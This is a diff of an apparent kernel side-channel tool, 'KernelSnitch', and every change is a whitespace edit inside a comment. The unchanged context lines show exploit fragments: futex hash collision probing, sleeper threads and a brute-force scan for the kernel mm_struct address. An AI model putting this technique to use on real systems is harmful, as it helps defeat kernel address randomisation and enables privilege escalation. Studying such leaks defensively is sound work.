@@ -78,7 +78,7 @@
  */
 
 /* Futex region: 64 GB virtual address space for diverse probe addresses.
- * MAP_NORESERVE — no physical pages committed until touched.  Only the
+ * MAP_NORESERVE — no physical pages committed until touched. Only the
  * single pile-up page is faulted in. */
 #define FUTEX_REGION_SZ (64UL * GB)
 
@@ -270,7 +270,7 @@ static int cmp_u64(const void *a, const void *b) {
   return (va > vb) - (va < vb);
 }
 
-/* Read an unsigned long from a sysfs file.  Returns 0 on failure. */
+/* Read an unsigned long from a sysfs file. Returns 0 on failure. */
 static unsigned long read_sysfs_ulong(const char *path) {
   FILE *f = fopen(path, "r");
   if (!f)
@@ -294,7 +294,7 @@ static int num_sleepers_created;
 
 static void *sleeper_fn(void *arg) {
   (void)arg;
-  /* Block on the pile-up futex.  The anonymous page is zero-filled,
+  /* Block on the pile-up futex. The anonymous page is zero-filled,
    * and we pass val=0, so the WAIT succeeds and the thread sleeps. */
   syscall(SYS_futex, (int *)pile_addr, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
   return NULL;
@@ -387,7 +387,7 @@ static uint64_t measure_wake(unsigned long addr) {
 static int find_collisions(unsigned long *collisions, int *num_collisions,
                            unsigned int hashsize) {
   /* Scale probe count: we need enough probes to expect ~4x MAX_COLLISIONS
-   * hits.  Each probe has a 1/hashsize chance of colliding.  For small
+   * hits. Each probe has a 1/hashsize chance of colliding. For small
    * hashtables (4 CPUs → hashsize=1024): 65536 probes → ~64 expected hits.
    * For large hashtables (128 CPUs → hashsize=32768): need ~2M probes. */
   unsigned long num_probes = (unsigned long)hashsize * MAX_COLLISIONS * 4;
@@ -618,9 +618,9 @@ static unsigned long brute_force_mm(unsigned long *collisions,
 
   /* The correct scan step is gcd(slab_size, PAGE_SIZE).
    * SLUB places objects at offsets {0, slab_size, 2*slab_size, ...}
-   * within page-aligned slab pages.  mm = pob + page_phys + k*slab_size,
+   * within page-aligned slab pages. mm = pob + page_phys + k*slab_size,
    * so valid mm offsets (mod PAGE_SIZE) cycle through
-   * {k*slab_size mod PAGE_SIZE}.  Stepping by gcd(slab_size, PAGE_SIZE)
+   * {k*slab_size mod PAGE_SIZE}. Stepping by gcd(slab_size, PAGE_SIZE)
    * hits every such residue. */
   unsigned long step = gcd_ul(mm_step, (unsigned long)PAGE_SIZE);
   unsigned long mm_start = POB_MIN;
@@ -742,7 +742,7 @@ int main(void) {
 
   printf("[.] trying KernelSnitch (futex hash timing) ...\n");
 
-  /* Check for CONFIG_FUTEX_PRIVATE_HASH mitigation.  When enabled,
+  /* Check for CONFIG_FUTEX_PRIVATE_HASH mitigation. When enabled,
    * private futexes use a per-mm hash table and mm_struct is NOT part
    * of the hash key, making the timing side-channel impossible. */
 #ifndef PR_FUTEX_HASH
@@ -793,7 +793,7 @@ int main(void) {
   /* Phase 3: Brute-force mm_struct address.
    *
    * Flat scan over [POB_MIN, POB_MAX + phys_mem) in steps of mm_struct
-   * size.  ~54 billion iterations per size for objsize=1280. */
+   * size. ~54 billion iterations per size for objsize=1280. */
   unsigned long phys_mem = (unsigned long)sysconf(_SC_PHYS_PAGES) *
                            (unsigned long)sysconf(_SC_PAGESIZE);
   if (phys_mem == 0)
